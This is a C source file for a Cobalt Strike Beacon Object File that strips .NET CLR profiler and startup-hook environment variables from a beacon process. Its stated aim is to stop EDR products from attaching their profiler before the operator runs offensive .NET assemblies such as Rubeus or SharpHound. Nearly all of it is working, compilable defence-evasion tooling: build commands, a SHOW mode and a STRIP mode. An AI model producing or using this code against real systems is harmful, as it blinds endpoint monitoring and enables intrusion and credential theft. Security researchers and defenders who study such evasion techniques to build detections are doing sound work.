/*
 * clr_profiler_strip.bof.c — Beacon Object File
 *
 * PURPOSE
 * -------
 * Clear CLR (Common Language Runtime) profiler injection environment
 * variables in the current process before loading any .NET assembly.
 *
 * HOW EDR .NET MONITORING WORKS
 * ------------------------------
 * The .NET CLR profiling API allows a DLL to attach to ANY .NET process and
 * receive callbacks for JIT compilation, method entry/exit, exceptions, GC,
 * and object allocation. EDR products exploit this to monitor .NET code:
 *
 *   COR_ENABLE_PROFILING=1         → enable profiling
 *   COR_PROFILER={GUID}            → CLSID of the EDR's profiler COM object
 *   COR_PROFILER_PATH=C:\EDR\p.dll → path to the profiler DLL
 *
 * When the CLR starts in a process (triggered by the first .NET assembly load),
 * it reads these environment variables. If set, it loads the profiler DLL and
 * calls ICorProfilerCallback::Initialize(). From that point on, the EDR
 * profiler receives callbacks for EVERY method call in managed code.
 *
 * This is how EDR products:
 *   - Monitor SharpHound, Rubeus, Seatbelt running via execute-assembly
 *   - Hook .NET reflection APIs to detect suspicious runtime assembly loading
 *   - Log managed method calls for behavioral analysis
 *
 * THE ATTACK
 * ----------
 * SetEnvironmentVariableW(name, NULL) removes the variable from the current
 * process's environment block. After stripping, the CLR starting up (triggered
 * by execute-assembly or any other .NET load mechanism) finds no profiler
 * configured and starts without attaching any EDR profiler DLL.
 *
 * IMPORTANT TIMING REQUIREMENT
 * ------------------------------
 * This BOF must run BEFORE the CLR is initialized in the beacon process.
 * The CLR reads profiler env vars at startup — once the CLR is running
 * (e.g., a previous execute-assembly was called), a profiler already attached
 * cannot be removed by stripping env vars. Run this BOF first.
 *
 * Variables stripped:
 *   .NET Framework 1-4 / CLR v2/v4:
 *     COR_ENABLE_PROFILING
 *     COR_PROFILER
 *     COR_PROFILER_PATH
 *     COR_PROFILER_PATH_32
 *     COR_PROFILER_PATH_64
 *   .NET Core / .NET 5+:
 *     CORECLR_ENABLE_PROFILING
 *     CORECLR_PROFILER
 *     CORECLR_PROFILER_PATH
 *     CORECLR_PROFILER_PATH_32
 *     CORECLR_PROFILER_PATH_64
 *     DOTNET_STARTUP_HOOKS          (for .NET 5+ startup hook injection)
 *     DOTNET_ADDITIONAL_DEPS
 *   Variants used by some EDRs:
 *     _COR_PROFILER
 *     _COR_PROFILER_PATH
 *     COMPLUS_DbgEnable
 *     COMPLUS_DbgMiniDumpName
 *
 * MODES
 * -----
 *   0 — SHOW:  Print current values of all CLR profiler env vars (read-only)
 *   1 — STRIP: Clear all CLR profiler env vars (irreversible for this session)
 *
 * COMPILATION
 *   mingw64: x86_64-w64-mingw32-gcc -o clr_profiler_strip.x64.o -c clr_profiler_strip.bof.c
 *   MSVC:    cl /c /TC /GS- /Foclr_profiler_strip.x64.obj clr_profiler_strip.bof.c
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include "beacon.h"

/* ─── Dynamic imports ────────────────────────────────────────────────────── */
DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$SetEnvironmentVariableW(LPCWSTR, LPCWSTR);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetEnvironmentVariableW(LPCWSTR, LPWSTR, DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);

/* ─── Variable list ──────────────────────────────────────────────────────── */

static const wchar_t* CLR_VARS[] = {
    /* .NET Framework profiler */
    L"COR_ENABLE_PROFILING",
    L"COR_PROFILER",
    L"COR_PROFILER_PATH",
    L"COR_PROFILER_PATH_32",
    L"COR_PROFILER_PATH_64",

    /* .NET Core / .NET 5+ profiler */
    L"CORECLR_ENABLE_PROFILING",
    L"CORECLR_PROFILER",
    L"CORECLR_PROFILER_PATH",
    L"CORECLR_PROFILER_PATH_32",
    L"CORECLR_PROFILER_PATH_64",

    /* .NET 5+ startup hooks (DLL injection mechanism) */
    L"DOTNET_STARTUP_HOOKS",
    L"DOTNET_ADDITIONAL_DEPS",
    L"DOTNET_SHARED_STORE",

    /* EDR variant names */
    L"_COR_PROFILER",
    L"_COR_PROFILER_PATH",
    L"COMPLUS_DbgEnable",
    L"COMPLUS_DbgMiniDumpName",

    NULL  /* sentinel */
};

/* ─── Helpers ────────────────────────────────────────────────────────────── */

static void ZeroMem(void* p, SIZE_T n) {
    volatile char* v = (volatile char*)p;
    SIZE_T i;
    for (i = 0; i < n; i++) v[i] = 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * Argument format (packed by CNA with bof_pack("i", mode)):
 *
 *   [int32] mode
 *     0 = SHOW:  print current CLR profiler env var values
 *     1 = STRIP: clear all CLR profiler env vars
 */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    LONG mode = BeaconDataInt(&parser);

    if (mode == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] CLR Profiler Strip: checking current environment...\n");

        int found = 0;
        wchar_t val[2048];
        for (int i = 0; CLR_VARS[i]; i++) {
            ZeroMem(val, sizeof(val));
            DWORD ret = KERNEL32$GetEnvironmentVariableW(CLR_VARS[i], val, 2047);
            if (ret > 0) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [SET] %-40S = %S\n", CLR_VARS[i], val);
                found++;
            }
        }

        if (found == 0) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [OK] No CLR profiler variables set in this process.\n"
                "       EDR .NET profiler will NOT be attached on CLR startup.\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "\n  [!] %d CLR profiler variable(s) set — EDR WILL attach to CLR!\n"
                "      Run 'clr_profiler_strip strip' BEFORE execute-assembly.\n", found);
        }

    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] CLR Profiler Strip: clearing CLR profiler env vars...\n");

        int cleared = 0, not_set = 0;
        for (int i = 0; CLR_VARS[i]; i++) {
            /* Check if set first */
            wchar_t val[16];
            DWORD ret = KERNEL32$GetEnvironmentVariableW(CLR_VARS[i], val, 15);
            if (ret == 0) {
                not_set++;
                continue;
            }
            /* Strip: pass NULL as value to delete */
            BOOL ok = KERNEL32$SetEnvironmentVariableW(CLR_VARS[i], NULL);
            if (ok) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [+] Cleared: %S\n", CLR_VARS[i]);
                cleared++;
            } else {
                BeaconPrintf(CALLBACK_ERROR,
                    "  [!] Failed to clear %S: %lu\n",
                    CLR_VARS[i], KERNEL32$GetLastError());
            }
        }

        BeaconPrintf((cleared > 0 || not_set > 0) ? CALLBACK_OUTPUT : CALLBACK_ERROR,
            "\n[*] RESULT: %d var(s) cleared, %d were not set\n"
            "    CLR profiler injection: DISABLED for this process\n"
            "    EDR cannot attach profiler to subsequent CLR startup\n"
            "    IMPORTANT: Run BEFORE execute-assembly, not after\n",
            cleared, not_set);
    }
}
